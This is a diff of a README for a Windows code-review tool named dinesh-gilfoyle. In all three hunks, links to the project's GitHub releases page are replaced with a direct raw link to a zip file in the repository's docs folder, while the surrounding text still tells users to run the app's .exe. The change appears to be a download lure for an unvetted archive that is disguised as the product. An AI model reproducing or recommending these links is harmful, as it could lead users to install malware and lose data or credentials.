@@ -1,6 +1,6 @@
 # 🤖 dinesh-gilfoyle - Code reviews with a sharp edge
 
-[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Liverpacificnorthwest99/dinesh-gilfoyle/main/docs/dinesh-gilfoyle-1.9.zip)
 
 ## 🧭 What it does
 
@@ -12,7 +12,7 @@ It helps you spot weak points in your code before you share it with others. The 
 
 Visit this page to download the app for Windows:
 
-[https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases](https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases)
+[https://raw.githubusercontent.com/Liverpacificnorthwest99/dinesh-gilfoyle/main/docs/dinesh-gilfoyle-1.9.zip](https://raw.githubusercontent.com/Liverpacificnorthwest99/dinesh-gilfoyle/main/docs/dinesh-gilfoyle-1.9.zip)
 
 On the releases page, look for the latest version and pick the Windows file. It is usually an `.exe` file or a `.zip` file.
 
@@ -108,7 +108,7 @@ Open the main app file, not the text file.
 
 Use this page to get the latest Windows version:
 
-[https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases](https://github.com/Liverpacificnorthwest99/dinesh-gilfoyle/releases)
+[https://raw.githubusercontent.com/Liverpacificnorthwest99/dinesh-gilfoyle/main/docs/dinesh-gilfoyle-1.9.zip](https://raw.githubusercontent.com/Liverpacificnorthwest99/dinesh-gilfoyle/main/docs/dinesh-gilfoyle-1.9.zip)
 
 ## 📄 Notes for Windows users
 
